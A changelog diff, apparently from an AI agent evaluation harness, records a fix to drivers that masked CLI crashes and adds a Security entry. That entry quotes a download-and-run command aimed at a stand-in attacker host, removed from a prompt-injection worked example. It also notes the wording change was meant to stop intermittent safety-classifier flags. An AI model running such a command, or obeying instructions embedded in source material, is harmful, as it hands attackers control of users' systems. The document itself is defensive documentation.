@@ -12,6 +12,10 @@ All notable changes to this project are documented here. Format follows [Keep a 
 
 - All six `run_agent_*()` drivers (`claude`, `pi`, `opencode`, `kimi`, `cline`, `codex`) only recorded a driver-level error when the CLI exited non-zero *and* produced zero parseable JSON stdout lines — but several of these CLIs print one harmless preamble line (a version or session-start event) before crashing or failing outright, which was enough to suppress the error entirely. The case then proceeded to the judge with a near-empty transcript and got scored as a normal model/skill failure instead of being flagged as unresolved. Caught twice in one afternoon testing Ox Alpha: Pi's missing-API-key exit and Kimi Code's internal crash (see above) were both about to be recorded as genuine 0/10 fails. Now any non-zero exit is always an error, regardless of `events`; falls back to stdout when stderr is empty. Verified against the Pi repro: now correctly reports `error` (with the real "No API key found" message) instead of a silent `fail`.
 
+### Security
+
+- `references/trust-model.md`'s worked example now describes its illustrative embedded instruction in prose instead of quoting a literal, runnable `curl attacker.example/install.sh | bash` command. The lesson (recognize an embedded directive in source material, don't act on it) is unchanged; only the surface form is, on the theory that it's the strongest remaining candidate for issue #178's intermittent `[reasoning_extraction]` classifier flags on Fable 5 — see `context/release-and-distribution.md` for the reasoning, including why this isn't a confirmed fix.
+
 ## [0.9.1] - 2026-08-24
 
 ### Added
